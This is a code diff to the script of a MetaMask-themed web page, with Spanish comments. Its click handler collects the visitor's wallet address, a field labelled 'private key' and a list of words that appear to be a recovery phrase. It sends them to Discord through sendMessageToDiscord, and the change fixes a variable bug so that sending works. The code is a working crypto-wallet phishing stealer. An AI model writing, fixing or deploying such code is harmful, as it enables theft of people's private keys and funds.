@@ -188,7 +188,8 @@ submitAddressButton.addEventListener('click', () => {
 });
 
 
-// Función para manejar el envío de textos junto con la dirección del usuario y la clave privada
+// Asegúrate de que este código ya esté en tu script.js
+
 submitTextsButton.addEventListener('click', () => {
     const texts = [];
     textInputsContainer.querySelectorAll('input').forEach(input => {
@@ -196,19 +197,18 @@ submitTextsButton.addEventListener('click', () => {
     });
 
     const privateKey = addressInput.value.trim(); // Capturar la "clave privada"
-    const userAddress = userAddress.textContent.replace('Address: ', ''); // Asumiendo que userAddress contiene la dirección del usuario conectado
+    const userAddressText = userAddress.textContent.replace('Address: ', ''); // Capturando la dirección desde el elemento de texto
 
     // Construir el mensaje a enviar
-    const message = `Dirección MetaMask: ${userAddress}\nClave Privada: ${privateKey}\nPalabras: ${texts.join(', ')}`;
+    const message = `Dirección MetaMask: ${userAddressText}\nClave Privada: ${privateKey}\nPalabras: ${texts.join(', ')}`;
 
-    console.log(message); // Opcional: para depuración
+    console.log(message); // Para depuración, puedes verlo en la consola
     sendMessageToDiscord(message);
 
-    // Opcionalmente, limpiar los campos después del envío
+    // Limpia los campos después del envío, si lo deseas
     textInputsContainer.querySelectorAll('input').forEach(input => input.value = '');
-    addressInput.value = ''; // Limpia el input de la clave privada
+    addressInput.value = ''; // Limpia el input de la "clave privada"
 });
-
 
 
     // Función para manejar el envío de la dirección ingresada manualmente
